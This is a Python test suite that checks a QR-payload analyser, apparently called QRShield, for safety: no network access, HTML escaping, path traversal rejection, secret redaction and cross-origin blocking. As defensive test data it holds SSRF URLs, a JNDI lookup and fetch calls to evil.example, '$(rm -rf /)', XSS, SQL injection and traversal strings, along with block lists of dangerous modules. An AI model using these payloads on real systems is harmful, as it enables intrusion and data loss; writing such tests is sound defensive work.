"""Security tests: QRShield must analyse untrusted content without carrying out, fetching, or leaking anything."""
import ast
import json
import re
import socket
from pathlib import Path

import httpx
import pytest

from qrshield_core.context.extract import context_from_scenario
from qrshield_core.image.loader import ImageError, load_image
from qrshield_core.pipeline import ABLATIONS, AnalysisConfig
from qrshield_core.threat_intel.base import MockThreatIntelProvider
from qrshield_core.threat_intel.service import ThreatIntelService

ROOT = Path(__file__).resolve().parents[2]
CORE = ROOT / "qrshield_core"


@pytest.fixture()
def no_network(monkeypatch):
    """Any attempt to open a connection, resolve a name, or send an HTTP request fails the test."""
    calls = []

    def boom(*a, **k):
        calls.append(a)
        raise AssertionError(f"network access attempted: {a[:2]}")
    monkeypatch.setattr(socket.socket, "connect", boom)
    monkeypatch.setattr(socket, "getaddrinfo", boom)
    monkeypatch.setattr(socket, "create_connection", boom)
    monkeypatch.setattr(httpx.Client, "send", boom)
    monkeypatch.setattr(httpx.AsyncClient, "send", boom)
    return calls


# ---------------------------------------------------------------- pre-action guarantee
def test_whole_dataset_is_analysed_with_zero_network_access(engine, no_network):
    sample_payloads = [
        ("upi://pay?pa=abctrading@okicici&pn=ABC%20Trading&am=850", {"organization": "Sunrise Hotel"}),
        ("https://example.com/login", {"organization": "Example Corp"}),
        ("WIFI:T:WPA;S:CoffeeShop;P:secret;;", {"organization": "Coffee Shop"}),
        ("SMSTO:+919876543210:Hello", {}),
        ("BEGIN:VCARD\nVERSION:3.0\nFN:Test\nEND:VCARD", {}),
        ("mailto:test@example.com", {}),
        ("slack://channel?id=123", {}),
    ]
    for raw, ctx in sample_payloads:
        for cfg in ABLATIONS.values():
            engine.analyze_payload(raw, context_from_scenario(ctx), cfg)
    assert not no_network


@pytest.mark.parametrize("payload", [
    "http://169.254.169.254/latest/meta-data/", "http://localhost:22/", "http://127.0.0.1:8080/admin", "http://[::1]/x", "file:///etc/passwd",
    "http://10.0.0.1/", "https://user:pw@internal.example/", "gopher://127.0.0.1:6379/_FLUSHALL", "http://2130706433/", "dict://localhost:11211/stat",
    "ftp://127.0.0.1/", "javascript:fetch('http://evil.example')", "data:text/html,<script>fetch('//evil.example')</script>",
])
def test_ssrf_style_payloads_are_never_contacted(engine, no_network, payload):
    mock = MockThreatIntelProvider(default={"malicious": 9})
    cfg = AnalysisConfig("full", threat_intel_mode="lookup", ti_override=True)       # even with the soft-block override
    res = engine.analyze_payload(payload, context_from_scenario({}), cfg, ti_service=ThreatIntelService(mock, engine.policy)).to_dict()
    assert res["payload"] is not None and not mock.calls and not no_network          # not even handed to the (mock) provider
    assert all(r["status"] in ("not_queried",) for r in res["threat_intel_results"])
    assert res["assessment"]["level"] != "harmful_corroborated"


def test_decoded_urls_are_never_followed_or_resolved(engine, no_network):
    res = engine.analyze_payload("https://bit.ly/3xYz", context_from_scenario({"organization": "ABC Shop"}), AnalysisConfig("full", threat_intel_mode="off")).to_dict()
    assert any(f["indicator_id"] == "URL-003" for f in res["payload_findings"]) and not no_network
    assert any("not visited, resolved or followed" in l for l in res["limitations"])


FORBIDDEN_MODULES = {"requests", "subprocess", "webbrowser", "ftplib", "smtplib", "telnetlib", "pickle", "marshal", "ctypes", "paramiko"}
FORBIDDEN_BUILTIN_CALLS = {"eval", "exec", "compile", "__import__"}              # builtins only (re.compile is a method call and is fine)
FORBIDDEN_ATTR_CALLS = {"system", "popen", "startfile", "spawnl", "spawnv", "execv", "execl"}


def test_core_has_no_forbidden_modules_or_dynamic_execution():
    offenders = []
    for f in CORE.rglob("*.py"):
        for n in ast.walk(ast.parse(f.read_text(encoding="utf-8"))):
            mods = []
            if isinstance(n, ast.Import):
                mods = [a.name for a in n.names]
            elif isinstance(n, ast.ImportFrom) and n.module:
                mods = [n.module]
            offenders += [(f.name, m) for m in mods if m.split(".")[0] in FORBIDDEN_MODULES or m == "urllib.request"]
            if isinstance(n, ast.Call):
                if isinstance(n.func, ast.Name) and n.func.id in FORBIDDEN_BUILTIN_CALLS:
                    offenders.append((f.name, f"call:{n.func.id}"))
                if isinstance(n.func, ast.Attribute) and n.func.attr in FORBIDDEN_ATTR_CALLS:
                    offenders.append((f.name, f"call:{n.func.attr}"))
    assert not offenders, offenders


def test_forbidden_call_scanner_actually_detects_violations(tmp_path):
    """Guard against a vacuous scan: the same logic must flag a deliberately bad module."""
    bad = ast.parse("import subprocess\nimport os\neval('1')\nos.system('id')\n__import__('x')\nimport re\nre.compile('a')\n")
    hits = []
    for n in ast.walk(bad):
        if isinstance(n, ast.Import) and any(a.name in FORBIDDEN_MODULES for a in n.names):
            hits.append("import")
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in FORBIDDEN_BUILTIN_CALLS:
            hits.append(n.func.id)
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr in FORBIDDEN_ATTR_CALLS:
            hits.append(n.func.attr)
    assert sorted(hits) == ["__import__", "eval", "import", "system"]            # and re.compile is not flagged


def test_network_libraries_are_confined_to_the_threat_intel_provider():
    users = {f.relative_to(ROOT).as_posix() for f in CORE.rglob("*.py") if re.search(r"^\s*(import|from)\s+(httpx|socket)\b", f.read_text(encoding="utf-8"), re.M)}
    assert users == {"qrshield_core/threat_intel/virustotal.py", "qrshield_core/normalizer/common.py"}
    # in the parser, socket is used only for the pure function inet_aton (detecting obfuscated IP notation); it never opens a connection
    uses = set(re.findall(r"\bsocket\.(\w+)", (CORE / "normalizer/common.py").read_text(encoding="utf-8")))
    assert uses == {"inet_aton"}


def test_no_shell_or_path_built_from_payload_in_app_layer():
    for f in (ROOT / "app").rglob("*.py"):
        src = f.read_text(encoding="utf-8")
        assert not re.search(r"\b(os\.system|subprocess|eval\(|exec\()", src)


# ---------------------------------------------------------------- hostile payloads
HOSTILE = [
    "<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>", "{{7*7}}{% raw %}", "${jndi:ldap://evil.example/a}", "'; DROP TABLE users;--",
    "../../../../etc/passwd", "..\\..\\windows\\system32", "\x00\x01\x02\x03", "\u202eevil\u202c", "A" * 100_000, "%00%0d%0a", "$(rm -rf /)", "`id`",
    "http://[::1", "http://" + "a." * 500 + "com", "upi://pay?pa=" + "x" * 5000, "WIFI:" + "S:" * 3000, "BEGIN:VCARD\n" * 500, "mailto:" + "a@b.example," * 500,
    "javascript:alert(document.cookie)", "intent://x#Intent;" + "a=b;" * 2000 + "end", "SMSTO:" + "9" * 5000 + ":x",
]


@pytest.mark.parametrize("payload", HOSTILE, ids=[f"payload_{i}" for i in range(len(HOSTILE))])
def test_hostile_payloads_never_crash_and_stay_serialisable(engine, no_network, payload):
    res = engine.analyze_payload(payload, context_from_scenario({"organization": payload[:50], "purpose": payload[:50]}), AnalysisConfig("full")).to_dict()
    assert res["assessment"]["level"] in ("no_material_concern", "needs_verification", "high_concern")
    json.dumps(res)
    assert len(json.dumps(res)) < 3_000_000            # output size is bounded even for 100 kB inputs


def test_html_is_escaped_in_every_rendered_context(settings, tmp_path):
    import io, qrcode
    from fastapi.testclient import TestClient
    from app.main import create_app
    from app.state import AppState
    from qrshield_core.pipeline import QRShieldEngine
    s = type(settings)(**{**settings.__dict__, "artifacts_dir": tmp_path})
    c = TestClient(create_app(AppState(s, QRShieldEngine(s, use_default_ocr=False))))
    for payload in ('<script>alert(1)</script>', 'WIFI:T:WPA;S:"><img src=x onerror=alert(1)>;P:x;;', 'mailto:"><svg onload=alert(1)>@x.example?subject=<b>x</b>'):
        q = qrcode.QRCode(box_size=8, border=4); q.add_data(payload); q.make(fit=True)
        buf = io.BytesIO(); q.make_image().convert("RGB").save(buf, "PNG")
        prep = c.post("/analyze/prepare", files={"image": ("<script>x</script>.png", buf.getvalue(), "image/png")})
        aid = re.search(r'name="analysis_id" value="([a-f0-9]{32})"', prep.text).group(1)
        res = c.post("/analyze/run", data={"analysis_id": aid, "qr_index": "0", "organization": "<script>alert(2)</script>", "additional": "<img src=x onerror=alert(3)>"})
        for html in (prep.text, res.text):
            assert "<script>alert" not in html and "<img src=x" not in html and "<svg onload" not in html and "onerror=alert" not in html.replace("&lt;img src=x onerror=alert", "")
        assert "&lt;script&gt;" in prep.text + res.text or "&lt;" in res.text


# ---------------------------------------------------------------- input limits & path safety
def test_image_limits_and_bomb_guard():
    import io
    from PIL import Image
    buf = io.BytesIO(); Image.new("RGB", (400, 400), "white").save(buf, "PNG")
    with pytest.raises(ImageError) as e:
        load_image(buf.getvalue(), max_bytes=10**7, max_pixels=1000, max_side=4000)
    assert e.value.code == "too_many_pixels"
    with pytest.raises(ImageError) as e:
        load_image(buf.getvalue(), max_bytes=10, max_pixels=10**8, max_side=4000)
    assert e.value.code == "too_large"
    ok = load_image(buf.getvalue(), max_bytes=10**7, max_pixels=10**8, max_side=100)
    assert max(ok.width, ok.height) == 100                       # large images are downscaled, not rejected


def test_filenames_are_sanitised():
    from qrshield_core.image.loader import sanitize_filename
    for bad, ok in (("../../etc/passwd", "passwd"), ("C:\\Windows\\x.png", "x.png"), ("<script>.png", "_script_.png"), ("", "upload"), ("a" * 300 + ".png", None)):
        out = sanitize_filename(bad)
        assert "/" not in out and "\\" not in out and ".." not in out and len(out) <= 80
        if ok:
            assert out == ok


@pytest.mark.parametrize("path", ["/image/..%2f..%2fetc%2fpasswd", "/image/zz", "/results/..%2f..%2fsecret.json",
                                  "/research/runs/..%2f..%2f/run_manifest.json", "/research/runs/20260101T000000Z-base-abcdef/..%2f..%2fetc%2fpasswd",
                                  "/research/runs/20260101T000000Z-base-abcdef/notallowed.txt", "/static/../app/main.py", "/static/%2e%2e/app/main.py"])
def test_path_traversal_is_rejected(settings, tmp_path, path):
    from fastapi.testclient import TestClient
    from app.main import create_app
    from app.state import AppState
    from qrshield_core.pipeline import QRShieldEngine
    s = type(settings)(**{**settings.__dict__, "artifacts_dir": tmp_path})
    c = TestClient(create_app(AppState(s, QRShieldEngine(s, use_default_ocr=False))))
    r = c.get(path)
    assert r.status_code in (400, 404, 422) and "root:" not in r.text and "def create_app" not in r.text


# ---------------------------------------------------------------- secrets & privacy
def test_api_key_is_never_logged_returned_or_sent_anywhere_but_the_header(settings, tmp_path, caplog):
    import logging
    from qrshield_core.pipeline import QRShieldEngine
    key = "VTKEY_abcdef0123456789abcdef0123456789"
    s = type(settings)(**{**settings.__dict__, "artifacts_dir": tmp_path, "virustotal_api_key": key})
    eng = QRShieldEngine(s, use_default_ocr=False)
    seen = []

    def handler(req):
        seen.append(req)
        return httpx.Response(404, json={})
    eng.ti_provider._client = httpx.Client(transport=httpx.MockTransport(handler))
    logging.getLogger("qrshield").propagate = True
    with caplog.at_level(logging.DEBUG, logger="qrshield"):
        res = eng.analyze_payload("https://abcshop.example/x", None, AnalysisConfig("full", threat_intel_mode="lookup")).to_dict()
    blob = json.dumps(res) + caplog.text + repr(eng.settings)
    assert key not in blob and key[:12] not in blob
    assert seen and seen[0].headers["x-apikey"] == key and key not in str(seen[0].url) and seen[0].url.host == "www.virustotal.com"


def test_only_the_url_leaves_the_machine(settings, tmp_path):
    from qrshield_core.pipeline import QRShieldEngine
    s = type(settings)(**{**settings.__dict__, "artifacts_dir": tmp_path, "virustotal_api_key": "K" * 32})
    eng = QRShieldEngine(s, use_default_ocr=False)
    sent = []

    def handler(req):
        sent.append((req.method, str(req.url), req.content))
        return httpx.Response(404, json={})
    eng.ti_provider._client = httpx.Client(transport=httpx.MockTransport(handler))
    ctx = context_from_scenario({"organization": "Super Secret Clinic Ltd", "additional": "Patient Jane Doe, phone +91 98765 43210"})
    eng.analyze_payload("https://abcshop.example/x", ctx, AnalysisConfig("full", threat_intel_mode="lookup"))
    wire = json.dumps(sent, default=str)
    assert "Secret Clinic" not in wire and "Jane Doe" not in wire and "98765" not in wire and len(sent) == 1


def test_sensitive_values_are_absent_from_results_and_logs(engine, caplog):
    import logging
    logging.getLogger("qrshield").propagate = True
    with caplog.at_level(logging.DEBUG, logger="qrshield"):
        w = engine.analyze_payload("WIFI:T:WPA;S:Cafe;P:Sup3rSecretPass!;;", None, AnalysisConfig()).to_dict()
        s = engine.analyze_payload("SMSTO:+910000000011:Send OTP 839123 now", None, AnalysisConfig()).to_dict()
        u = engine.analyze_payload("https://a.example/p?token=TOKEN_VALUE_123&password=hunter2", None, AnalysisConfig()).to_dict()
    blob = json.dumps([w, s, u]) + caplog.text
    for secret in ("Sup3rSecretPass", "839123", "TOKEN_VALUE_123", "hunter2"):
        assert secret not in blob
    assert w["payload"]["normalized_fields"]["password_present"] is True


# ---------------------------------------------------------------- CSRF / DNS rebinding against a local instance
@pytest.fixture()
def local_client(settings, tmp_path):
    from fastapi.testclient import TestClient
    from app.main import create_app
    from app.state import AppState
    from qrshield_core.pipeline import QRShieldEngine
    s = type(settings)(**{**settings.__dict__, "artifacts_dir": tmp_path})
    return TestClient(create_app(AppState(s, QRShieldEngine(s, use_default_ocr=False))), base_url="http://127.0.0.1:8000")


@pytest.mark.parametrize("origin", ["http://evil.example", "http://127.0.0.1:9999", "null", "https://localhost:8000"])
def test_cross_origin_state_changes_are_rejected(local_client, origin):
    for path, kw in (("/research/run", {"data": {"suite": "base"}}), ("/analyze/run", {"data": {"analysis_id": "0" * 32}}),
                     ("/api/v1/analyze-payload", {"json": {"payload": "x"}})):
        r = local_client.post(path, headers={"Origin": origin}, **kw)
        assert r.status_code == 403 and r.json()["error"] == "cross_origin_request_rejected", (path, origin)
    assert not local_client.app.state.qs.list_runs()                      # nothing was executed


def test_same_origin_and_non_browser_clients_still_work(local_client):
    assert local_client.post("/analyze/run", data={"analysis_id": "0" * 32}, headers={"Origin": "http://127.0.0.1:8000"}).status_code == 410
    assert local_client.post("/api/v1/analyze-payload", json={"payload": "Table 12"}).status_code == 200      # no Origin header (curl-style)
    assert local_client.get("/", headers={"Origin": "http://evil.example"}).status_code == 200                  # reads are unaffected


@pytest.mark.parametrize("host", ["evil.example", "attacker.example:8000", "169.254.169.254"])
def test_unexpected_host_header_is_rejected(local_client, host):
    assert local_client.get("/health", headers={"Host": host}).status_code == 400
